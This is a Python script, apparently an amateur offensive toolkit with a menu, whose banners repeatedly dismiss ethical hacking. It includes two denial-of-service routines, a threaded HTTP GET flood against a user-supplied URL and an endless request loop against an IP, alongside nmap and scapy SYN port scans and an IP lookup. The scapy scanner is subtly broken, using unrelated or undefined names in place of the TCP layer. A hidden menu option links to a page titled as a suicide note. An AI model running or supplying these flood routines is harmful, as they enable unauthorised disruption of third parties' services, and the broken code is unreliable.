
from aiohttp import TCPConnector
import colorama
from colorama import Fore, Back, Style
import requests
import threading
import nmap
import time
import platform
import os
from scapy.all import *
from colorama import just_fix_windows_console
just_fix_windows_console()
colorama.init(autoreset=True)

def print_title():
    version = "Version 1.1.2"
    title = '''
|  __ \               ___|           _)       |   
| |   |  _ \   __| \___ \   __|  __| | __ \  __|  
| |   | (   |\__ \       | (    |    | |   | |   
| ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
                                     _|         
    Creator : Makar0v

    Note : Fuck ethical hacking do what you whant will this tools .
    '''
    print(Back.BLACK + Fore.CYAN + title)
    print(Back.BLACK + Fore.RED + version)

def DDOS():
    print_title()

    url = input("Url --> ")
    
    def Ddos():
        requests.get(url)
    threads = []
    for _ in range(999999999999):
        thread = threading.Thread(target=Ddos)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
def run_nmap_scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-sS -p 1-2000') 


    for host in nm.all_hosts():
        if nm[host].state() == 'up':
            print(f"Host: {host} | State: {nm[host].state()}")
            for proto in nm[host].all_protocols():
                print(f"Protocol: {proto}")
                ports = nm[host][proto].keys()
                for port in ports:
                    print(f"Port: {port} | State: {nm[host][proto][port]['state']}")

def threaded_scan(target):
    scan_thread = threading.Thread(target=run_nmap_scan, args=(target,))
    scan_thread.start()
    scan_thread.join()
def scan_ports(target, ports, timeout=1):
    open_ports = []
    for port in ports:
        src_port = RandShort()
        response = sr1(IP(dst=target)/TCP(sport=src_port, dport=port, flags="S"), timeout=timeout, verbose=0)
        if response and response.haslayer(TCPConnector):
            if response[TCP_CONNECTION_INFO].flags == 18:
                open_ports.append(port)
    return open_ports

def run_scapy_scan():
    target_ip = input("Enter the target IP address to scan: ")
    start_port = int(input("Enter the starting port: "))
    end_port = int(input("Enter the ending port: "))

    port_range = range(start_port, end_port + 1)

    open_ports = scan_ports(target_ip, port_range)
    if open_ports:
        print(f"Open ports on {target_ip}: {open_ports}")
    else:
        print(f"No open ports found on {target_ip}")


def send_get_request(ip_address):
    urlza = f"http://{ip_address}"
    try:
        response = requests.get(urlza)
        if response.status_code == 200:
            print(Back.BLACK + Fore.MAGENTA + f"Attack Sended.")
        else:
            print(f"Request failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(Back.BLACK + Fore.RED + f"Attack failed: :(")

principal_title = '''
                                   _______         ___________           .__          
  _____ _____ ____________    ____ \   _  \___  __ \__    ___/___   ____ |  |   ______
 /     \\__  \\_  __ \__  \ _/ ___\/  /_\  \  \/ /   |    | /  _ \ /  _ \|  |  /  ___/
|  Y Y  \/ __ \|  | \// __ \\  \___\  \_/   \   /    |    |(  <_> |  <_> )  |__\___ \ 
|__|_|  (____  /__|  (____  /\___  >\_____  /\_/     |____| \____/ \____/|____/____  >
      \/     \/           \/     \/       \/                                       \/
Dev : Marak0v
Note : Fuck ethical hacking do what you whant will this tools .
Version 1.0.4-Open Source
'''
print(Back.BLACK + Fore.CYAN + principal_title)
menu = {
    '1': "DOS",
    '2': "Nmap",
    '3': "Scapy",
    '4': "Ip Dos",
    '5': "Ip Lookup",
    '6': "Ip Lookup with Tor Network",
    '7':"System Info",
    '8': "Credit",
    '9': "Exit" ,

}
while True:
    options = list(menu.keys())
    options.sort()
    for entry in options:
        print(entry, Back.BLACK + Fore.GREEN + menu[entry])

    selection = input(Back.BLACK + Fore.MAGENTA + "Please Select: ")
    if selection == '1':
        DDOS()
    elif selection == '2':
        target_ip = input("Enter the target IP address or range to scan: ")
        print('If your pc is not powerfull it can take a wille so yeah')
        print('Actual Nmap command use "Nmap -sS IP -p 1-2000"')
        run_nmap_scan(target_ip)
    elif selection == '3':
        print('It like nmap but faster :]')
        run_scapy_scan()
        time.sleep(10)
    elif selection == '4':
        print(Back.BLACK + Fore.MAGENTA + '''
        $$$$$$\                 $$$$$$$\   $$$$$$\   $$$$$$\  
        \_$$  _|                $$  __$$\ $$  __$$\ $$  __$$\ 
          $$ |   $$$$$$\        $$ |  $$ |$$ /  $$ |$$ /  \__|
          $$ |  $$  __$$\       $$ |  $$ |$$ |  $$ |\$$$$$$\  
          $$ |  $$ /  $$ |      $$ |  $$ |$$ |  $$ | \____$$\ 
          $$ |  $$ |  $$ |      $$ |  $$ |$$ |  $$ |$$\   $$ |
        $$$$$$\ $$$$$$$  |      $$$$$$$  | $$$$$$  |\$$$$$$  |
        \______|$$  ____/       \_______/  \______/  \______/ 
                $$ |                                          
                $$ |             Made by Makar0v                             
                \__|     
            Note : Fuck ethical hacking do what you whant will this tools .                                     
        ''')
        #                                                                 ________
        #                                                                |        \
        #Hi you can look at the source code nuw :]                      \/        |
        ip_address = input(Back.BLACK + Fore.RED + 'Put an ip to attack :')#happy face
        while True:
         send_get_request(ip_address)
    elif selection == '5':
        print(Back.BLACK + Fore.GREEN +'''                                                                                                                                                        
                                                                                                                                                        
IIIIIIIIII                        LLLLLLLLLLL                                   000000000     kkkkkkkk          UUUUUUUU     UUUUUUUU                   
I::::::::I                        L:::::::::L                                 00:::::::::00   k::::::k          U::::::U     U::::::U                   
I::::::::I                        L:::::::::L                               00:::::::::::::00 k::::::k          U::::::U     U::::::U                   
II::::::II                        LL:::::::LL                              0:::::::000:::::::0k::::::k          UU:::::U     U:::::UU                   
  I::::I ppppp   ppppppppp          L:::::L                  ooooooooooo   0::::::0   0::::::0 k:::::k    kkkkkkkU:::::U     U:::::Uppppp   ppppppppp   
  I::::I p::::ppp:::::::::p         L:::::L                oo:::::::::::oo 0:::::0     0:::::0 k:::::k   k:::::k U:::::D     D:::::Up::::ppp:::::::::p  
  I::::I p:::::::::::::::::p        L:::::L               o:::::::::::::::o0:::::0     0:::::0 k:::::k  k:::::k  U:::::D     D:::::Up:::::::::::::::::p 
  I::::I pp::::::ppppp::::::p       L:::::L               o:::::ooooo:::::o0:::::0 000 0:::::0 k:::::k k:::::k   U:::::D     D:::::Upp::::::ppppp::::::p
  I::::I  p:::::p     p:::::p       L:::::L               o::::o     o::::o0:::::0 000 0:::::0 k::::::k:::::k    U:::::D     D:::::U p:::::p     p:::::p
  I::::I  p:::::p     p:::::p       L:::::L               o::::o     o::::o0:::::0     0:::::0 k:::::::::::k     U:::::D     D:::::U p:::::p     p:::::p
  I::::I  p:::::p     p:::::p       L:::::L               o::::o     o::::o0:::::0     0:::::0 k:::::::::::k     U:::::D     D:::::U p:::::p     p:::::p
  I::::I  p:::::p    p::::::p       L:::::L         LLLLLLo::::o     o::::o0::::::0   0::::::0 k::::::k:::::k    U::::::U   U::::::U p:::::p    p::::::p
II::::::IIp:::::ppppp:::::::p     LL:::::::LLLLLLLLL:::::Lo:::::ooooo:::::o0:::::::000:::::::0k::::::k k:::::k   U:::::::UUU:::::::U p:::::ppppp:::::::p
I::::::::Ip::::::::::::::::p      L::::::::::::::::::::::Lo:::::::::::::::o 00:::::::::::::00 k::::::k  k:::::k   UU:::::::::::::UU  p::::::::::::::::p 
I::::::::Ip::::::::::::::pp       L::::::::::::::::::::::L oo:::::::::::oo    00:::::::::00   k::::::k   k:::::k    UU:::::::::UU    p::::::::::::::pp  
IIIIIIIIIIp::::::pppppppp         LLLLLLLLLLLLLLLLLLLLLLLL   ooooooooooo        000000000     kkkkkkkk    kkkkkkk     UUUUUUUUU      p::::::pppppppp    
          p:::::p                                                                                                                    p:::::p            
          p:::::p                                                                                                                    p:::::p            
         p:::::::p                                                                                                                  p:::::::p           
         p:::::::p                                               happy face                                                         p:::::::p           
         p:::::::p                                                   :p                                                             p:::::::p           
         ppppppppp                                                                                                                  ppppppppp    
         Note : Fuck ethical hacking do what you whant will this tools .       
---------------------------------------------------------------------------------------------------------------------------------------------------------''')
        ip = input(Back.BLACK + Fore.RED +'Enter an ip to Lookup :')
        url = f"https://ipinfo.io/{ip}/json"
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        print(data)
        time.sleep(10)
    elif selection == '6':
        print('test')
    elif selection == '7':
        print("it windows it window bitch this code work only on windows :]")
        time.sleep(10)
    elif selection == '8':
        print('''
It not a rat i am not this stupid even if i am a bit
but putting a rat in a open-source program is
useless becose it like leaking your
private information . :]
        ''')
        time.sleep(10)
    elif selection == 'ben':
        print('''Rip in peace Ben.;[
             13/04/2009 -10/04/2024
              https://b3nj4m1n.ch/suicidenote''')
        time.sleep(45432254)
    elif selection == '9':
        break
    else:
        print("Unknown Option Selected!")
